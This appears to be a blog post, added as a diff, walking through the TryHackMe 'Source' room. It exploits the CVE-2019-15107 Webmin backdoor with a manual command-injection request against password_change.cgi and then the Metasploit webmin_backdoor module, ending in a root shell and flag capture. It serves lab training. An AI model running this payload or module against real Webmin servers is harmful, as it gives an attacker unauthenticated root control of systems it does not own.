@@ -1,0 +1,211 @@
+---
+title: 'Source'
+description: 'Exploiting CVE-2019-15107, the Webmin command-injection backdoor, using Metasploit to land a root shell.'
+publishDate: 2026-09-03
+tags:
+  - cybersecurity
+  - tryhackme
+  - web
+---
+
+**Difficulty:** Easy **Category:** Exploiting a known CVE (CVE-2019-15107, backdoor/command injection in Webmin), use of the Metasploit Framework **Room:** [https://tryhackme.com/room/source](https://tryhackme.com/room/source)
+
+## Room description
+
+> “Can you find the source of the disruption and take advantage of it to take control?”
+
+A Linux machine centred on **Webmin**, a popular web-based system administration interface (it lets you manage users, services, backups, etc. from the browser). A vulnerable version of Webmin installed on the target contains a **historic backdoor** (malicious code inserted directly into the project itself during a compromise of its build repository), catalogued as **CVE-2019-15107**, which allows remote command execution without authentication. The room’s goal is to exploit this vulnerability entirely through the **Metasploit Framework**.
+
+> **Note on placeholders:** `{IP}` stands for the IP TryHackMe assigns (it changes on every deploy). `tun0` is the name of your TryHackMe VPN network interface; in some environments it may be named differently (check with `ip a`).
+
+---
+
+## 1. Recon (nmap)
+
+```bash
+nmap -sV -sC -oA scans/initial-scan {IP}
+```
+
+- `-sV`: service version detection.
+- `-sC`: nmap default scripts.
+- `-oA scans/initial-scan`: saves the result simultaneously in all three nmap output formats (`.nmap`, `.gnmap`, `.xml`) under that base name — handy to have both a readable version and one parseable by other tools.
+
+**Expected ports:**
+
+| Port      | Service                                                          |
+| --------- | ---------------------------------------------------------------- |
+| 22/tcp    | SSH (OpenSSH)                                                    |
+| 10000/tcp | **Webmin** (web administration interface, over HTTPS by default) |
+
+Port **10000** is Webmin’s default port, and it is the key piece of this machine. nmap’s version detection (`-sV`) or the service’s own banner (visible when connecting directly, for example with `curl -k` since it usually uses self-signed TLS) should confirm it corresponds to a **vulnerable Webmin** version (versions **1.890 to 1.920**).
+
+```bash
+curl -sk https://{IP}:10000/ -I
+```
+
+- `-k`: ignores TLS certificate errors (Webmin usually uses a self-signed certificate by default).
+
+---
+
+## 2. Vulnerability context — CVE-2019-15107
+
+### 2.1 Origin of the backdoor
+
+Unlike a code vulnerability “discovered” by researchers, **CVE-2019-15107** originated because Webmin’s official build server was compromised by an attacker, who inserted malicious code directly into the `password_change.cgi` file of the packages officially distributed between versions **1.882 and 1.921** — that is, the backdoor was present in legitimate downloads from the project’s own official site for over a year before being detected.
+
+### 2.2 Technical mechanism
+
+The `old` parameter (and also `expired`) of the `password_change.cgi` script — normally used to verify the user’s “old” password before allowing a change — does not correctly sanitise its input before passing it to an internal system call. This allows **operating-system command injection**: any additional text after a command separator (like `|`) in that parameter is executed directly on the server, **with root privileges** (since the Webmin process itself usually runs as root to be able to administer the system).
+
+A manual proof of concept (without Metasploit) would take the form of an HTTP request like this:
+
+```
+POST /password_change.cgi HTTP/1.1
+Host: {IP}:10000
+Content-Type: application/x-www-form-urlencoded
+
+user=root&pam=&expired=2&old=test|id&new1=test2&new2=test2
+```
+
+- The `old=test|id` field is the injection vector: after the `|` character, the `id` command runs on the server, with its output reflected back in the HTTP response (for example, embedded in the “The current password is incorrect” error message).
+
+> **Important requirement of this vulnerability:** in Webmin version 1.890 (the most common on practice machines like this one), the backdoor works with the **default configuration**. In later versions (up to 1.920), the **self-password-change** option needs to be enabled in the panel for the vector to be exploitable — a relevant detail if you try to reproduce the technique manually in another environment.
+
+---
+
+## 3. Exploitation with the Metasploit Framework
+
+Instead of building the HTTP request by hand, use the module already built into **Metasploit** that automates this whole technique.
+
+### 3.1 Start Metasploit
+
+```bash
+msfconsole
+```
+
+### 3.2 Search for the module
+
+```
+msf6 > search webmin_backdoor
+```
+
+This lists one or more related modules; the one relevant for RCE is:
+
+```
+exploit/linux/http/webmin_backdoor
+```
+
+### 3.3 Load the module
+
+```
+msf6 > use 0
+```
+
+- `use 0`: loads the module indicated by its index number in the previous search results (equivalent to `use exploit/linux/http/webmin_backdoor`, but faster if you already have the number in view).
+
+### 3.4 Review the available options
+
+```
+msf6 exploit(linux/http/webmin_backdoor) > options
+```
+
+This shows the module’s configurable parameters, the most relevant being:
+
+| Option      | Description                                                                            |
+| ----------- | -------------------------------------------------------------------------------------- |
+| `RHOSTS`    | Target IP(s)                                                                           |
+| `RPORT`     | Webmin service port (default `10000`)                                                  |
+| `SSL`       | Whether to negotiate TLS/SSL on the outbound connection (Webmin uses HTTPS by default) |
+| `TARGETURI` | Webmin base path (default `/`)                                                         |
+| `LHOST`     | Your attacker IP, to receive the reverse shell                                         |
+| `LPORT`     | Local port to listen on for the callback                                               |
+
+### 3.5 Configure the parameters
+
+```
+msf6 exploit(linux/http/webmin_backdoor) > set RHOST {IP}
+msf6 exploit(linux/http/webmin_backdoor) > set LHOST tun0
+```
+
+- `set RHOST {IP}`: sets the target IP (in recent Metasploit versions, `RHOSTS` is the preferred name, but `RHOST` still works as an alias).
+- `set LHOST tun0`: instead of typing your IP manually, Metasploit lets you give the **network interface name** directly (`tun0`, the TryHackMe VPN interface) and automatically resolves the IP associated with that interface — very convenient in environments like TryHackMe where your VPN IP can change between sessions.
+
+### 3.6 Run the exploit
+
+```
+msf6 exploit(linux/http/webmin_backdoor) > run
+```
+
+### 3.7 Fixing a common error (SSL)
+
+If running `run` produces a connection error related to SSL/TLS (for example, the module trying to connect over plain HTTP when the service actually requires HTTPS, or vice versa), you must explicitly enable SSL negotiation before retrying:
+
+```
+msf6 exploit(linux/http/webmin_backdoor) > set ssl true
+msf6 exploit(linux/http/webmin_backdoor) > run
+```
+
+- `set ssl true`: forces Metasploit to negotiate TLS/SSL on the outbound connection to port 10000, matching Webmin’s default configuration (which serves its interface over HTTPS, typically with a self-signed certificate).
+
+When it runs correctly, Metasploit automatically obtains a **Meterpreter session** (or a basic shell, depending on the module’s default payload configuration), with **root** privileges — since, as explained, the vulnerable Webmin process runs with those privileges.
+
+```
+meterpreter > shell
+# or, if the payload delivered a command shell directly:
+id
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
+---
+
+## 4. Getting the flags
+
+### 4.1 Show file stats (quick root-access check)
+
+```bash
+wc /root/root.txt
+```
+
+- `wc` (_word count_): without showing the content, it confirms the file exists and is accessible, reporting its line, word and byte counts — a quick way to verify you really have read access to a root-restricted file, even before reading it with `cat`.
+
+### 4.2 Explore the system and grab both flags
+
+```bash
+ls /home/dark/
+cat /home/dark/user.txt
+```
+
+- `/home/dark/`: the home directory of a normal system user (`dark`), where the **user flag** lives, even having obtained direct root access — a reminder that, after a successful exploit, it is worth also exploring the non-privileged user accounts to build a complete picture of the compromised system.
+
+```bash
+ls /root/
+cat /root/root.txt
+```
+
+- The **root flag**, confirming full control of the system.
+
+---
+
+## 5. Attack chain summary
+
+1. **Recon** with `nmap` → SSH (22) and **Webmin** (10000), with a version vulnerable to **CVE-2019-15107**.
+2. **Vulnerability context**: a backdoor inserted directly into Webmin’s official code (versions 1.882–1.921) after a compromise of the project’s build server, exploitable via command injection in the `old` parameter of `password_change.cgi`.
+3. **Exploitation with Metasploit**: search (`search webmin_backdoor`), load (`use`), configure (`set RHOST`, `set LHOST tun0`, and `set ssl true` if needed) and run (`run`) the `exploit/linux/http/webmin_backdoor` module.
+4. **Direct root access**, with no intermediate privilege-escalation steps (the vulnerability itself already grants the maximum level of access).
+5. **Capture both flags**: the user flag in `/home/dark/user.txt` and the root flag in `/root/root.txt`.
+
+## 6. Lessons learned / key concepts
+
+- **Backdoors inserted into the software supply chain (supply-chain attacks)** are especially dangerous because they affect “official”, legitimate downloads from the project itself — unlike a code vulnerability discovered by researchers, here the distributed binary itself was malicious from its origin for months.
+- **Webmin, being a system-administration interface, typically runs with root privileges** to be able to perform administrative tasks (managing users, services, network, etc.) — this means **any** RCE vulnerability in Webmin automatically translates into full system compromise, with no need for a separate privilege-escalation phase.
+- **Metasploit as an exploitation platform**: the flow `search` → `use` → `options`/`show options` → `set` (parameters) → `run` is the standard pattern for using any Metasploit exploit module, and it is worth mastering, since it repeats identically for practically any exploit in the framework.
+- **`set LHOST <interface>`** (using the interface name instead of the IP directly) is a useful Metasploit shortcut when working in VPN environments (like TryHackMe or HackTheBox), avoiding having to look up the IP manually with `ip a` every time it changes.
+- **The `SSL` parameter in Metasploit modules** must match the real protocol the target service uses (HTTP vs. HTTPS); a connection error when running an exploit does not always mean the target is not vulnerable — sometimes it is simply an easy-to-fix transport configuration mismatch.
+
+## 7. Tools used
+
+`nmap`, `curl` (verifying the Webmin service), **Metasploit Framework** (`msfconsole`, the `exploit/linux/http/webmin_backdoor` module).
+
+---
+
+_Academic write-up, built from my own notes solving the “Source” machine on TryHackMe, supplemented with public community write-ups and technical documentation of CVE-2019-15107 to explain the backdoor’s origin (a compromise of Webmin’s supply chain) and the exact command-injection mechanism that makes it exploitable._
